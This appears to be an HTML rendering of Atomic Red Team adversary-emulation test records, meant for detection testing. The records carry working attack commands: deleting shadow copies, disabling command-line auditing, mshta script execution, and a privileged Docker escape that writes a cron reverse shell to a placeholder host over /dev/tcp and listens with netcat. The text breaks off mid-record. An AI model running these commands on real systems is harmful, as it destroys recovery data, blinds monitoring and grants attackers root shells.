<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 39a295ca-7059-4a88-86f6-09556c1211e7</li>
<li><strong>name</strong>: Windows - Delete Volume Shadow Copies via WMI with PowerShell</li>
<li>
<p><strong>description</strong>: Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.
This technique is used by numerous ransomware families such as Sodinokibi/REvil.
Executes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution
there may be no output displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1490</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 95f5c72f-6dfe-45f3-a8c1-d8faa07176fa</li>
<li><strong>name</strong>: Disable Windows Command Line Auditing using Powershell Cmdlet</li>
<li><strong>description</strong>: In Windows operating systems, command line auditing is controlled through the following registry value:</li>
</ul>
<p>Registry Path: HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit</p>
<p>Registry Value: ProcessCreationIncludeCmdLine_Enabled</p>
<p>When command line auditing is enabled, the system records detailed information about command execution, including the command executed, the user account responsible for executing the command, and the timestamp of the execution.
This information is crucial for security monitoring and forensic analysis, as it helps organizations detect and investigate unauthorized or malicious activities within their systems.
By default, command line auditing may not be enabled in Windows systems, and administrators must manually configure the appropriate registry settings to activate it.
Conversely, attackers may attempt to tamper with these registry keys to disable command line auditing, as part of their efforts to evade detection and cover their tracks while perpetrating malicious activities.</p>
<p>Because this attack runs a Powershell cmdlet, this attack can be detected by monitoring both:
  Powershell Logging (Windows Powershell Event ID 400, 800, 4103, 4104)
  Registry events (Windows Event ID 4657, Sysmon Event ID 13)</p>
<p>Read more here:
https://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-220703123711.html
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-itemproperty?view=powershell-7.4#example-2-add-a-registry-entry-to-a-key</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: New-ItemProperty -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: New-ItemProperty -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1 -PropertyType DWORD -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1562.003</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 2158908e-b7ef-4c21-8a83-3ce4dd05a924</li>
<li><strong>name</strong>: File and Directory Discovery (PowerShell)</li>
<li>
<p><strong>description</strong>: Find or discover files on the file system. Upon execution, file and folder information will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: ls -recurse
get-childitem -recurse
gci -recurse</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1083</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: c6c34f61-1c3e-40fb-8a58-d017d88286d8</li>
<li><strong>name</strong>: Simulating MAZE Directory Enumeration</li>
<li>
<p><strong>description</strong>: This test emulates MAZE ransomware's ability to enumerate directories using Powershell. 
Upon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. 
See https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $folderarray = @("Desktop", "Downloads", "Documents", "AppData/Local", "AppData/Roaming")
Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}
Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}
Get-ChildItem -Path "${env:ProgramFiles(x86)}" -erroraction silentlycontinue | Out-File -append #{File_to_output}
$UsersFolder = "$env:homedrive\Users\"
foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) 
{
foreach ($secondarydirectory in $folderarray)
 {Get-ChildItem -Path "$UsersFolder/$directory/$secondarydirectory" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}
}
cat #{File_to_output}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: remove-item #{File_to_output} -ErrorAction SilentlyContinue</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1083</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 906865c3-e05f-4acc-85c4-fbc185455095</li>
<li><strong>name</strong>: Mshta executes VBScript to execute malicious command</li>
<li>
<p><strong>description</strong>: Run a local VB script to run local user enumeration powershell command.
This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
Upon execution, a new PowerShell windows will be opened that displays user information.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"":close")</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1218.005</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 8707a805-2b76-4f32-b1c0-14e558205772</li>
<li><strong>name</strong>: Mshta used to Execute PowerShell</li>
<li>
<p><strong>description</strong>: Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}"""))</script>'"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1218.005</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 6c499943-b098-4bc6-8d38-0956fc182984</li>
<li><strong>name</strong>: Mount host filesystem to escape privileged Docker container</li>
<li>
<p><strong>description</strong>: This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.
The container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.
Dev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. </p>
</li>
<li>
<p><strong>platforms</strong>: ['containers']</p>
</li>
<li>
<p><strong>command</strong>: if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi
echo -n "* * * * * root /bin/bash -c '/bin/bash -c echo \"\"; echo \"hello from host! " &gt; #{mount_point}#{cron_path}/#{cron_filename}
echo -n "$" &gt;&gt; #{mount_point}#{cron_path}/#{cron_filename}
echo -n "(hostname) " &gt;&gt; #{mount_point}#{cron_path}/#{cron_filename}
echo -n "$" &gt;&gt; #{mount_point}#{cron_path}/#{cron_filename}
echo "(id)\" &gt;&amp; /dev/tcp/#{listen_address}/#{listen_port} 0&gt;&amp;1'" &gt;&gt; #{mount_point}#{cron_path}/#{cron_filename}
netcat -l -p #{listen_port} 2&gt;&amp;1</p>
</li>
<li>
<p><strong>prereq_command</strong>: which mount</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: if [ "" == "<code>which mount</code>" ]; then echo "mount Not Found"; if [ -n "<code>which apt-get</code>" ]; then sudo apt-get -y install mount ; elif [ -n "<code>which yum</code>" ]; then sudo yum -y install mount ; fi ; else echo "mount installed"; fi</p>
</li>
<li>
<p><strong>cleanup_command</strong>: rm #{mount_point}#{cron_path}/#{cron_filename}
umount #{mount_point}
rmdir #{mount_point}</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1611</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
